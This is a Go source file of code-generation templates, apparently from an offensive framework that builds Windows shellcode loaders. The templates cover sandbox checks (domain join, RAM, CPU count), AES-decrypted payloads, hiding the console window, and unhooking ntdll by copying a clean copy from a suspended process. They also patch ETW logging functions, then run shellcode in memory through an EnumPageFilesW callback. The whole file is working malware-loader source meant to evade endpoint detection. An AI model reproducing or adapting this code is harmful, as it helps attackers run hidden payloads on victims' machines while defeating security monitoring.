package Struct

func DLL_Export() string {
	return `
	//export DllRegisterServer
	func DllRegisterServer() {
		Run()
	}
	
	//export DllGetClassObject
	func DllGetClassObject() {
		Run()
	}
	
	//export DllUnregisterServer
	func DllUnregisterServer() {
		Run()
	}

	{{.Variables.ExportFunction}}

	func main(){

	}


	//export Run
	func Run(){

	`
}

func Sandbox() string {
	return `
	type MEMORYSTATUSEX struct {
		dwLength                uint32
		dwMemoryLoad            uint32
		ullTotalPhys            uint64
		ullAvailPhys            uint64
		ullTotalPageFile        uint64
		ullAvailPageFile        uint64
		ullTotalVirtual         uint64
		ullAvailVirtual         uint64
		ullAvailExtendedVirtual uint64
	}

	func Check() {
		{{.Variables.Domaincheck}}, _ := {{.Variables.DomainJoinedCheck}}()
		if {{.Variables.Domaincheck}} == false {
			os.Exit(3)
		}
		{{.Variables.RAMCheck}} := {{.Variables.RAMCheckSize}}(4)
		if {{.Variables.RAMCheck}} == false {
			os.Exit(3)
		}
		{{.Variables.CPUcheck}} := {{.Variables.CPU}}(2)
		if {{.Variables.CPUcheck}} == false {
			os.Exit(3)
		}
	}
	
	func {{.Variables.DomainJoinedCheck}}() (bool, error) {
		var {{.Variables.domain}} *uint16
		var {{.Variables.status}} uint32
		err := syscall.NetGetJoinInformation(nil, &{{.Variables.domain}}, &{{.Variables.status}})
		if err != nil {
			return false, err
		}
		syscall.NetApiBufferFree((*byte)(unsafe.Pointer({{.Variables.domain}})))
		return {{.Variables.status}} == syscall.NetSetupDomainName, nil
	}
	
	func {{.Variables.CPU}}({{.Variables.minCheck}} int64) bool {
		{{.Variables.num_procs}} := runtime.NumCPU()
			{{.Variables.minimum_processors_required}} := int({{.Variables.minCheck}})
		if {{.Variables.num_procs}} >= {{.Variables.minimum_processors_required}} {
			return true
		}
		return false
	}
	
	func {{.Variables.RAMCheckSize}}({{.Variables.num}} uint64) bool {
		var {{.Variables.memInfo}} MEMORYSTATUSEX
			{{.Variables.kernel32}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',}))
			{{.Variables.globalMemoryStatusEx}} := {{.Variables.kernel32}}.NewProc("GlobalMemoryStatusEx")
			{{.Variables.memInfo}}.dwLength = uint32(unsafe.Sizeof({{.Variables.memInfo}}))
				{{.Variables.globalMemoryStatusEx}}.Call(uintptr(unsafe.Pointer(&{{.Variables.memInfo}})))
		if {{.Variables.memInfo}}.ullTotalPhys/1073741824 > {{.Variables.num}} {
			return true
		}
		return false
	}
	
	

	`

}

func Encrypt() string {
	return `

	func {{.Variables.PKCS5UnPadding}}({{.Variables.src}} []byte) []byte {
		{{.Variables.length}} := len({{.Variables.src}})
		{{.Variables.unpadding}}  := int({{.Variables.src}}[{{.Variables.length}}-1])
		return {{.Variables.src}}[:({{.Variables.length}} - {{.Variables.unpadding}} )]
	}
	
	
	func {{.Variables.Shellcode}}() {
	{{.Variables.vciphertext}}, _ := base64.StdEncoding.DecodeString("{{.Variables.fullciphertext}}")

	{{.Variables.vkey}}, _ := base64.StdEncoding.DecodeString("{{.Variables.key}}")
	{{.Variables.viv}}, _ := base64.StdEncoding.DecodeString("{{.Variables.iv}}")

	{{.Variables.block}}, _ := aes.NewCipher({{.Variables.vkey}})

	{{.Variables.decrypted}} := make([]byte, len({{.Variables.vciphertext}}))
	{{.Variables.mode}} := cipher.NewCBCDecrypter({{.Variables.block}}, {{.Variables.viv}})
	{{.Variables.mode}}.CryptBlocks({{.Variables.decrypted}}, {{.Variables.vciphertext}})
	{{.Variables.stuff}} := {{.Variables.PKCS5UnPadding}}({{.Variables.decrypted}})

	{{.Variables.rawdata}} := (string({{.Variables.stuff}}))
	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})`

}
func Hex() string {
	return `
	func {{.Variables.Shellcode}}() {
		{{.Variables.hexdata}} := "{{.Variables.shellcodeencoded}}"
	`
}

func Console() string {
	return `
	func {{.Variables.Console}}(show bool) {
		{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc("GetConsoleWindow")
		{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc("ShowWindow")
		{{.Variables.hwnd}}, _, _ := {{.Variables.getWin}}.Call()
		if {{.Variables.hwnd}} == 0 {
			return
		}
		if show {
		var {{.Variables.SW_RESTORE}} uintptr = 9
		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_RESTORE}})
		} else {
		var {{.Variables.SW_HIDE}} uintptr = 0
		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
		}
	}
`
}

func Main_Body() string {
	return `
	package main

	{{.Variables.ImportC}}

	
import (
	"debug/pe"
	"encoding/hex"
	"fmt"
	"os"
	{{.Variables.CryptImports}}
	"syscall"
	"time"
	"unsafe"
	{{.Variables.DebugImport}}
	{{.Variables.imports}}
	"golang.org/x/sys/windows"
)


{{.Variables.Debug}}

{{.Variables.Console}}

var {{.Variables.modntdll}} = windows.NewLazySystemDLL("ntdll.dll")
var {{.Variables.funcNtReadVirtualMemory}} = {{.Variables.modntdll}}.NewProc("NtReadVirtualMemory")

var {{.Variables.modkernel32}} = windows.NewLazySystemDLL("kernel32.dll")
var {{.Variables.procWriteProcessMemory}} = {{.Variables.modkernel32}}.NewProc("WriteProcessMemory")
var {{.Variables.procReadProcessMemory}} = {{.Variables.modkernel32}}.NewProc("ReadProcessMemory")

var {{.Variables.funcNtWriteVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
var {{.Variables.funcNtAllocateVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
var {{.Variables.funcNtProtectVirtualMemory}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))

var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'N', 'o', 't', 'i', 'f', 'i', 'c', 'a', 't', 'i', 'o', 'n', 'R', 'e', 'g', 'i', 's', 't', 'e', 'r'}))
var {{.Variables.procEtwEventRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'R', 'e', 'g', 'i', 's', 't', 'e', 'r'}))
var {{.Variables.procEtwEventWriteFull}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 'F', 'u', 'l', 'l'}))
var {{.Variables.procEtwEventWrite}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e'}))

const (
	{{.Variables.PROCESS_ALL_ACCESS}}= 0x1F0FFF
)

const (
	{{.Variables.errnoERROR_IO_PENDING}} = 997
)

var (
	{{.Variables.errERROR_IO_PENDING}} error = syscall.Errno({{.Variables.errnoERROR_IO_PENDING}})
	{{.Variables.Ntdllbytes}}          []byte
	{{.Variables.ntdlloffset}}         uint
	{{.Variables.ntdllsize}}           uint
)

func {{.Variables.errnoErr}}(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case {{.Variables.errnoERROR_IO_PENDING}}:
		return {{.Variables.errERROR_IO_PENDING}}
	}
	return e
}

func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

type SyscallError struct {
	call string
	err  error
}

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

func {{.Variables.CreateProcess}}() *syscall.ProcessInformation {
	var {{.Variables.si}} syscall.StartupInfo
	var {{.Variables.pi}} syscall.ProcessInformation

	{{.Variables.Target}} := "C:\\Windows\\System32\\{{.Variables.process}}"
	{{.Variables.commandLine}}, err := syscall.UTF16PtrFromString({{.Variables.Target}})

	if err != nil {
		panic(err)
	}
	var {{.Variables.startupInfo}} StartupInfoEx
	{{.Variables.si}}.Cb = uint32(unsafe.Sizeof({{.Variables.startupInfo}}))
	{{.Variables.si}}.Flags = windows.STARTF_USESHOWWINDOW
	{{.Variables.si}}.ShowWindow = windows.SW_HIDE

	err = syscall.CreateProcess(
		nil,
		{{.Variables.commandLine}},
		nil,
		nil,
		false,
		uint32(windows.CREATE_SUSPENDED),
		nil,
		nil,
		&{{.Variables.si}},
		&{{.Variables.pi}})

	if err != nil {
		panic(err)
	}

	return &{{.Variables.pi}}
}

func {{.Variables.readProcessMemory}}({{.Variables.procHandle}} windows.Handle, {{.Variables.address}} uint64,  {{.Variables.size}} uint) []byte {
	var {{.Variables.read}} uint

	buffer := make([]byte, {{.Variables.size}} )

	ret, _, _ := {{.Variables.funcNtReadVirtualMemory}}.Call(
		uintptr({{.Variables.procHandle}}),
		uintptr({{.Variables.address}}),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr({{.Variables.size}}),
		uintptr(unsafe.Pointer(&{{.Variables.read}})),
	)
	if int(ret) >= 0 && {{.Variables.read}} > 0 {
		return buffer[:{{.Variables.read}}]
	}
	return nil

}


{{.Variables.Sandbox}}


func {{.Variables.ETW}}({{.Variables.handlez}} windows.Handle) {
	{{.Variables.dataAddr}} := []uintptr{ {{.Variables.procEtwNotificationRegister}}.Addr(), {{.Variables.procEtwEventRegister}}.Addr(), {{.Variables.procEtwEventWriteFull}}.Addr(), {{.Variables.procEtwEventWrite}}.Addr()}
	for {{.Variables.i}}, _ := range {{.Variables.dataAddr}} {
		{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
		var {{.Variables.nLength}} uintptr
		{{.Variables.datalength}} := len({{.Variables.data}})
		{{.Variables.WriteProcessMemory}}({{.Variables.handlez}}, {{.Variables.dataAddr}}[{{.Variables.i}}], uintptr(unsafe.Pointer(&{{.Variables.data}}[0])), uintptr(uint32({{.Variables.datalength}})), &{{.Variables.nLength}})
	}
}


{{.Variables.StartingFunction}}


	{{.Variables.SandboxCall}}
	{{.Variables.hide}}
	{{.Variables.processID}} := uint32(os.Getpid())
	{{.Variables.processHandle}}, _ := windows.OpenProcess({{.Variables.PROCESS_ALL_ACCESS}}, false, uint32({{.Variables.processID}}))
	{{.Variables.CreatingSuspended}}
	{{.Variables.pi}} := {{.Variables.CreateProcess}}()
	{{.Variables.ProcessIDdebug}}
	{{.Variables.ProcessID}}
	{{.Variables.Creating}}
	time.Sleep(5 * time.Second)
	{{.Variables.hh}}, err := windows.OpenProcess({{.Variables.PROCESS_ALL_ACCESS}}, false, {{.Variables.pi}}.ProcessId)
	if err != nil {
	}

	if {{.Variables.hh}} != 0 {
		{{.Variables.Handle}}
	} else {
		os.Exit(1)
	}

	{{.Variables.Ntdllbytes}}, {{.Variables.ntdllsize}}, {{.Variables.ntdlloffset}} = {{.Variables.ReadRemoteProcess}}("C:\\Windows\\System32\\ntdll.dll", {{.Variables.hh}})
	{{.Variables.ntdllsizefmtdebug}}
	{{.Variables.ntdlloffsetfmtdebug}}
	{{.Variables.NTDLL}}

	{{.Variables.magic}}("ntdll.dll", {{.Variables.Ntdllbytes}}, {{.Variables.ntdlloffset}}, {{.Variables.ntdllsize}}, {{.Variables.processHandle}})
	
	stringpid := int({{.Variables.pi}}.ProcessId)
	p, _ := os.FindProcess(stringpid)
	p.Kill()
	{{.Variables.ETWdebug}} 
	{{.Variables.ETW}}({{.Variables.processHandle}})
	{{.Variables.Shellcodedebug}} 
	{{.Variables.Shellcode}}()
}

func {{.Variables.ReadRemoteProcess}}({{.Variables.name}} string, {{.Variables.handle}} windows.Handle) ([]byte, uint, uint) {
	{{.Variables.Parsing}}
	{{.Variables.file}}, error := pe.Open({{.Variables.name}})
	if error != nil {
	}
	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
	{{.Variables.size}} := {{.Variables.x}}.Size
	{{.Variables.loaddll}}, error := windows.LoadDLL({{.Variables.name}})
	if error != nil {
	}
	{{.Variables.ddhandlez}} := {{.Variables.loaddll}}.Handle
	{{.Variables.dllBase}} := uintptr({{.Variables.ddhandlez}})
	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
	{{.Variables.Reading}}
	{{.Variables.rawr}}, err := {{.Variables.ReadProcessMemoryy}}({{.Variables.handle}}, uintptr({{.Variables.dllOffset}}), uintptr({{.Variables.size}}))
	if err != nil {
		fmt.Println(err)
	}
	return {{.Variables.rawr}}, uint({{.Variables.size}}), {{.Variables.dllOffset}}
}

func {{.Variables.magic}}({{.Variables.name}} string, {{.Variables.bytes}} []byte, {{.Variables.addr}} uint, {{.Variables.size}} uint, {{.Variables.handlez}} windows.Handle) {
	{{.Variables.Restoring}}
	var {{.Variables.nLength}} uintptr
	{{.Variables.test}} := {{.Variables.WriteProcessMemory}}({{.Variables.handlez}}, uintptr({{.Variables.addr}}), uintptr(unsafe.Pointer(&{{.Variables.bytes}}[0])), uintptr(uint32(len({{.Variables.bytes}}))), &{{.Variables.nLength}})
	if {{.Variables.test}} != nil {
		fmt.Println({{.Variables.test}})
	} else {
		{{.Variables.Restored}}
	}
}
func {{.Variables.WriteProcessMemory}}({{.Variables.hProcess}} windows.Handle, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.lpBuffer}} uintptr, {{.Variables.nSize}} uintptr, {{.Variables.lpNumberOfBytesWritten}} *uintptr) (err error) {
	{{.Variables.r1}}, _, {{.Variables.e1}} := syscall.Syscall6({{.Variables.procWriteProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer({{.Variables.lpBuffer}})), uintptr({{.Variables.nSize}}), uintptr(unsafe.Pointer({{.Variables.lpNumberOfBytesWritten}})), 0)
	if {{.Variables.r1}} == 0 {
		if {{.Variables.e1}} != 0 {
			err = {{.Variables.errnoErr}}({{.Variables.e1}})
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func {{.Variables.ReadProcessMemoryy}}({{.Variables.hProcess}} windows.Handle, {{.Variables.lpBaseAddress}} uintptr, {{.Variables.nSize}} uintptr) ({{.Variables.data}} []byte, err error) {
	{{.Variables.data}}= make([]byte, {{.Variables.nSize}})
	var {{.Variables.nbr}} uintptr = 00
	{{.Variables.ret}}, _, err := syscall.Syscall6({{.Variables.procReadProcessMemory}}.Addr(), 5, uintptr({{.Variables.hProcess}}), uintptr({{.Variables.lpBaseAddress}}), uintptr(unsafe.Pointer(&{{.Variables.data}}[0])), {{.Variables.nSize}}, uintptr(unsafe.Pointer(&{{.Variables.nbr}})), 0)
	if {{.Variables.ret}} == 0 {
		return nil, err
	}

	return {{.Variables.data}}, nil
}


	{{.Variables.ShellcodeStart}}
	{{.Variables.shellcode}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
	var {{.Variables.lpBaseAddress}} uintptr
	{{.Variables.size}} := len({{.Variables.shellcode}})

	{{.Variables.oldProtect}} := windows.PAGE_READWRITE
	{{.Variables.NtAllocateVirtualMemory}}
	{{.Variables.funcNtAllocateVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), 0, uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	{{.Variables.NtWriteVirtualMemory}}
	{{.Variables.funcNtWriteVirtualMemory}}.Call(uintptr(0xffffffffffffffff), {{.Variables.lpBaseAddress}}, uintptr(unsafe.Pointer(&{{.Variables.shellcode}}[0])), uintptr({{.Variables.size}}), 0)
	{{.Variables.NtProtectVirtualMemory}}
	{{.Variables.funcNtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Variables.oldProtect}})))

	{{.Variables.psapi}} := windows.NewLazySystemDLL("psapi.dll")
	{{.Variables.EnumPageFilesW}} := {{.Variables.psapi}}.NewProc("EnumPageFilesW")
	{{.Variables.EnumPageFilesW}}.Call({{.Variables.lpBaseAddress}}, 0)

}
`
}
